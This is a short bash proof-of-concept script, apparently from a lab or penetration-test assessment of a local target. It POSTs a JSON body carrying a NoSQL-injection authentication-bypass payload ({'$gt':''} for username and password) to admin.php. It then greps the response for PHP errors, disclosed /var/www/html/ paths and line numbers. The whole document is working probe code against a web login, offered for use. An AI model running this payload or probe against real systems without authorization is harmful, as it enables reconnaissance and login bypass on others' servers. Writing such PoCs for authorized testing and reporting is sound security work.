#!/bin/bash

# POC: Information Disclosure - PHP Error Messages Exposed via Invalid Content-Type
# This script demonstrates how sending JSON POST requests to admin.php
# triggers PHP error messages that expose file paths and line numbers

TARGET_URL="${1:-http://localhost:32768/admin.php}"
PAYLOAD='{"username":{"$gt":""},"password":{"$gt":""}}'

echo "[*] Testing Information Disclosure Vulnerability"
echo "[*] Target: $TARGET_URL"
echo "[*] Sending JSON POST request with application/json Content-Type"
echo "[*] Payload: $PAYLOAD"
echo ""

# Send the request and capture the response
RESPONSE=$(curl -s -X POST \
  -H "Content-Type: application/json" \
  -d "$PAYLOAD" \
  "$TARGET_URL")

echo "[*] Response received:"
echo "---"
echo "$RESPONSE"
echo "---"
echo ""

# Check for PHP error indicators
if echo "$RESPONSE" | grep -q "Notice\|Error\|Warning"; then
    echo "[+] PHP error messages detected!"
fi

# Check for file path disclosure
if echo "$RESPONSE" | grep -q "/var/www/html/"; then
    echo "[+] VULNERABILITY CONFIRMED: File path disclosed (/var/www/html/)"
    FILE_PATH=$(echo "$RESPONSE" | grep -oP '/var/www/html/[^\<]*' | head -1)
    echo "    Disclosed path: $FILE_PATH"
fi

# Check for line numbers
if echo "$RESPONSE" | grep -q "on line"; then
    echo "[+] VULNERABILITY CONFIRMED: Line numbers disclosed"
    LINE_NUMBERS=$(echo "$RESPONSE" | grep -oP 'on line <b>\K[0-9]+' )
    echo "    Disclosed line numbers: $LINE_NUMBERS"
fi

# Check for specific admin.php references
if echo "$RESPONSE" | grep -q "admin.php"; then
    echo "[+] VULNERABILITY CONFIRMED: admin.php file name exposed"
fi

echo ""
echo "[*] Information Disclosure Assessment Complete"